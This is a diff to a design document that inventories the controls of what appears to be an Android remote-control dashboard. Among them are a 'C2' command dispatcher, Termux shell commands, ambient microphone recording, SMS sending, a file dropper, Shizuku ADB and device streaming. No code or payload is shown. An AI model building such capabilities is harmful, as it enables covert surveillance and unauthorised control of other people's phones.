@@ -32,14 +32,14 @@
   - `social/{appKey}`: Feed items `{ appKey, sender, message, timestamp }`
   - `webrtc_signaling/sessions/{sessionId}`: WebRTC negotiation sessions `{ status, requestedCapabilities, offer, answer, candidates }`
 
-### 5. Web Dashboard Interactive Controls Inventory
-- **Auth Handlers**: `#loginForm`, `#logoutBtn` (`auth.js`)
+### 5. Web Dashboard Interactive Controls & Form Handler Inventory
+- **Auth Handlers**: `#loginForm` (`signInWithEmailAndPassword`), `#logoutBtn` (`signOut`) (`auth.js`)
 - **SPA Router**: `.nav-link[data-route]` (`routes.js`)
 - **Device Selector**: `#deviceSelector` (`app.js`)
 - **Global Command Action Delegation**: `.exec-cmd` (26 buttons -> `sendC2CommandToDevice`)
 - **Termux Command Delegation**: `.termux-quick` (5 buttons -> `sendC2CommandToDevice('/termux ...')`)
 - **WebRTC P2P Session**: `#startP2pWebStreamBtn`, `#stopP2pWebStreamBtn` (`webrtc-manager.js`)
-- **Specialized Control Forms**: Ambient Mic, SMS Sender, Shizuku ADB, Geofence, File Dropper (`app.js`), Social Chat (`social.js`)
+- **Specialized Control Forms**: `#termuxForm`, `#smsSendForm`, `#openUrlForm`, `#startMicRecordBtn`, `#shizukuForm`, `#geofenceForm`, `#fileDropperForm` (`app.js`), `#socialChatForm` (`social.js`) — 100% active with input validation & feedback notifications
 
 ---
 
